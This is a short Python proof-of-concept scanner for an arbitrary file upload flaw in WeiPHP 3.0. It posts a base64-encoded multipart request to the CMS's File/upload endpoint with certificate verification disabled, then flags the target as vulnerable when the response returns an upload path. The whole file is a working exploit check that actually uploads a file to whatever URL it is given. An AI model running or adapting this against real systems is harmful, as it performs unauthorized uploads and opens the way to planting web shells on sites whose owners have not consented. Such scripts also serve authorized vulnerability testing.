#!/usr/bin/env python
# coding=utf-8
#WeiPHP3.0任意文件上传
import base64
from termcolor import colored
import requests,threading
requests.packages.urllib3.disable_warnings()  #忽略证书报错
results = ''
def pscan_vuln(url):
    urls = url
    global results
    headers = {
        "Content-Length": "213",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "null",
        "Content-Type": "multipart/form-data;boundary=------------------------e37a54d7d5380c9f",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close",
    }
    data = base64.b64decode('LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1lMzdhNTRkN2Q1MzgwYzlmCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZG93bmxvYWQiOyBmaWxlbmFtZT0iMS50eHQiCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtCgoxCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tZTM3YTU0ZDdkNTM4MGM5Zi0t')
    try:
        response = requests.post(url+'/index.php?s=%2FHome%2FFile%2Fupload%2Fsession_id%2Fscevs8hub3m5ogla05a421hb42.html', headers=headers,data=data,verify=False,timeout=20)
        if '"path":"\/Uploads\/Download\/' in response.text:
            print(colored('[+]存在WeiPHP3.0任意文件上传', 'red'))
            results = f'{urls}-->存在WeiPHP3.0任意文件上传'
        else:
            print('[-]不存在WeiPHP3.0任意文件上传')
    except:
        print('[-]不存在WeiPHP3.0任意文件上传')

def WeiPHP3(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results

